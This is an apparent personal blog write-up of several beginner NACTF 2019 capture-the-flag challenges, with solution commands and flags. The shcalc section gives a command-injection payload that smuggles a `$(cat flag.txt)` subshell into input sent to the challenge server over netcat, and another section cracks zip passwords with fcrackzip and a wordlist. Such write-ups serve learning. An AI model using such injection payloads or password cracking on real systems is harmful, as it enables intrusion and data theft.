---
title: "Newarkctf19 writeup"
tags: ["ctf", "newarkctf"]
date: 2019-09-22T22:36:51Z
draft: false
---

# shcalc (200)

### Description

![alt text](/images/newarkctf/shacalc200.png)
### Hint

![alt text](/images/newarkctf/shacalc200hint.png)

### Solution
> This is code injection

![alt text](/images/newarkctf/shacalc200injected1.png)

> `echo '$(cat flag.txt | tr " " ".") 2>&1'  |  nc shell.2019.nactf.com 31214a`


### Flag

> `nactf{3v4l_1s_3v1l_dCf80yOo}`
![alt text](/images/newarkctf/shacalcflag.png)


==========================================

# BufferOverflow #0 (100)
      
### Description

> The close cousin of a website for "Question marked as duplicate"
> Can you cause a segfault and get the flag?
> shell.2019.nactf.com:31475

### Hint
> What does it mean to overflow the buffer?

### Solution

![alt text](/images/newarkctf/bufferoverflow0.png)

### Flag

> `nactf{0v3rfl0w_th4at_buff3r_18ghKusB}`
  

==========================================

# Unzip Me (150)



### Description

  
> I stole these files off of  The20thDucks' computer, but it seems he was smart enough to put a  password on them. Can you unzip them for me?
>  Given three password protrected zip files  
> zip1.zip
> zip2.zip 
> zip3.zip

### Hint

>    There are many tools that can crack zip files for you

>    All the passwords are real words and all lowercase

### Solution

 > I used fcrackzip to crack zip files 

  `fcrackzip  -u -D -p  /usr/share/wordlists/rockyou.txt zip1.zip`

 `PASSWORD FOUND!!!!: pw == dictionary`

  `fcrackzip  -u -D -p  /usr/share/wordlists/rockyou.txt zip2.zip`

  `PASSWORD FOUND!!!!: pw == rock`

  `fcrackzip  -u -D -p  /usr/share/wordlists/rockyou.txt zip3.zip`

  `PASSWORD FOUND!!!!: pw == dog`


> `strings zip1.rtf`

> `{\rtf1\ansi\ansicpg1252\cocoartf1671\cocoasubrtf500
> {\fonttbl\f0\fswiss\fcharset0 Helvetica;}
> {\colortbl;\red255\green255\blue255;}
> {\*\expandedcolortbl;;}
> \margl1440\margr1440\vieww10800\viewh8400\viewkind0
> \pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
> \f0\fs24 \cf0 nactf\{w0w}`



![alt text](/images/newarkctf/unzipme150-zip1.png)
![alt text](/images/newarkctf/unzipme150-zip2.png)
![alt text](/images/newarkctf/unzipme150-zip3.png)
![alt text](/images/newarkctf/unzipme150-zip4.png)
![alt text](/images/newarkctf/unzipme150-zip5.png)

### Flag

> `nactf{w0w_y0u_unz1pp3d_m3}`
  
      
==========================================

# GET a grep #0 (100)

### Description
>Vikram was climbing a chunky tree when he  decided to hide a flag on one of the leaves. There are 10,000 leaves so  there's no way you can find the right one in time... Can you open up a  terminal window and get a grep on the flag?
>give a bigtree.zip file with a bunch of folders

### Solution
> `grep -ri "nactf"`

>`branch8/branch3/branch5/leaf8351.txt`

![alt text](/images/newarkctf/getgrep0.png)

### Flag
> `nactf{v1kram_and_h1s_10000_l3av3s}`


==========================================



# GET a GREP#1 (125)

### Description
>  Juliet hid a flag among 100,000  dummy ones so I don't know which one is real! But maybe the format of  her flag is predictable? I know sometimes people add random characters  to the end of flags... I think she put 7 random vowels at the end of  hers. Can you get a GREP on this flag?
>  We give a flag.txt full of 10,000 flags

### Hint
> Look up regular expressions (regex) and the regex option in grep!

### Solution

> `grep -iE '[aeiou]{7}' flag.txt`

![alt text](/images/newarkctf/getagrep1.png)

### Flag
> `nactf{r3gul4r_3xpr3ss10ns_ar3_m0r3_th4n_r3gul4r_euaiooa}`



==========================================


# Filesystem Image (200)

### Description

> Put the path to flag.txt together to get the flag! for example, if it was located at ab/cd/ef/gh/ij/flag.txt, your flag would be nactf{abcdefghij}

### Hint

> Check out loop devices on Linux

### Solution
> `sudo  mount -o loop,offset=512 fsimage.iso /media/`

> `find /media/ -iname "flag.txt"`
> `/media/lq/wk/zo/py/hu/flag.txt`

> `cat /media/lq/wk/zo/py/hu/flag.txt`

> `They'll never find this! HAhahAHahAHAHaHAHAHAA
> >:)`

![alt text](/images/newarkctf/fsimage0.png)
### Flag

> `nactf{lqwkzopyhu}`


==========================================

# Pink Panther (50)

### Description

> Rahul loves the Pink Panther. He even made this website: http://pinkpanther.web.2019.nactf.com. I think he hid a message somewhere on the webpage, but I don't know where... can you INSPECT and find the message? https://www.youtube.com/watch?v=2HMSnfeNf8c
> 

### Hint
> First thing to do with web exploitation is to check page source code`

### Solution

![alt text](/images/newarkctf/pinkpanther1.png)

### Flag
![alt text](/images/newarkctf/pinkpantherflag.png)
> `nactf{1nsp3ct_b3tter_7han_c10us3au}`


==========================================

# Cat over the wire (50)
      
### Description

> Open up a terminal and connect to the server at shell.2019.nactf.com on port 31242 and get the flag!
>  Use this netcat command in terminal:
>  nc shell.2019.nactf.com 31242
 
### Solution
> The solution was given
> `user@csaw-nyu-19:~/Downloads$ nc shell.2019.nactf.com 31242`

### Flag
`nactf{th3_c4ts_0ut_0f_th3_b4g}`


==========================================

# Vyom's Soggy Croutons (50)
### Description

> Vyom was eating a CAESAR salad with a bunch of wet croutons when he sent me this:
>  ertkw{vk_kl_silkv}
>  Can you help me decipher his message?
  
### Solution
> The caesar salad was a big hint for that this was caesar encrypted
> https://cryptii.com/pipes/caesar-cipher  
> ceasar cipher shift by 9 and you will get flag
  
### Flag
`nactf{et_tu_brute}`


==========================================

##### I ran out of time and the ctf ended.
##### My final score was 1110 pts

![alt text](/images/newarkctf/kad3cl_total-points.png)
![alt text](/images/newarkctf/kad3cl-solved-challenges.png)
